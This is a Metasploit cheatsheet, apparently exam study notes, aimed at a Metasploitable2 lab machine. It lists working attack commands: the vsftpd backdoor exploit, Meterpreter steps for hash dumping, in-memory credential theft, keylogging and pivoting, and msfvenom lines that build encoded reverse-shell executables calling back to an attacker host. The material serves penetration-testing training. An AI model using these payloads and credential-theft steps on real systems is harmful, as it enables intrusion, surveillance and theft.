# Metasploit Cheatsheet

Framework docs: https://docs.metasploit.com/ · Practice target: Metasploitable2 `192.168.56.20`.

## msfconsole workflow

```bash
msfconsole -q                      # quiet start
db_status                          # confirm the postgres db is connected
workspace -a ceh                   # isolate this engagement's data

search type:exploit vsftpd         # find a module
use exploit/unix/ftp/vsftpd_234_backdoor
info                               # read before you run
show options
set RHOSTS 192.168.56.20
set LHOST 192.168.56.10            # your Kali
show payloads
set PAYLOAD cmd/unix/interact
check                              # (if supported) verify vuln without exploiting
run                                # or: exploit
```

## Module types (know these)

| Type | Purpose |
|---|---|
| exploit | Delivers a payload via a vulnerability |
| payload | Code that runs on the target (shell, meterpreter) |
| auxiliary | Scanners, fuzzers, DoS, enum (no payload) |
| post | Post-exploitation (loot, pivot, persist) |
| encoder | Obfuscate payloads (e.g. shikata_ga_nai) |
| nops | Padding / NOP sleds |

Payload naming: **staged** uses `/` (e.g. `windows/meterpreter/reverse_tcp` — sends a small stager then the rest); **stageless/inline** uses `_` (e.g. `windows/meterpreter_reverse_tcp`).

## Meterpreter (post-exploitation)

```bash
sysinfo            getuid           # who/where am I
getprivs           ps               # privileges / processes
migrate <pid>      # move into a stabler process
hashdump           # dump SAM hashes (needs SYSTEM)
load kiwi          # mimikatz-style creds in memory
screenshot         keyscan_start    # surveillance
download / upload  # move files
portfwd add -l 3389 -p 3389 -r <ip>   # pivot
run post/multi/recon/local_exploit_suggester
background         # keep session, return to msf
sessions -l        sessions -i 1    # list / interact
```

## msfvenom (payload generation)

```bash
# Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o shell.elf
# Windows reverse shell EXE, encoded
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o s.exe
# List payloads / formats
msfvenom -l payloads | grep meterpreter
msfvenom --list formats
```

Catch it with a handler:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.10 ; set LPORT 4444 ; run
```

## Exam recall

- **Auxiliary ≠ exploit** — scanners/DoS live in auxiliary.
- **Staged (`/`) vs stageless (`_`)** payload distinction is a classic question.
- `migrate` + `hashdump` require appropriate privilege (often SYSTEM).
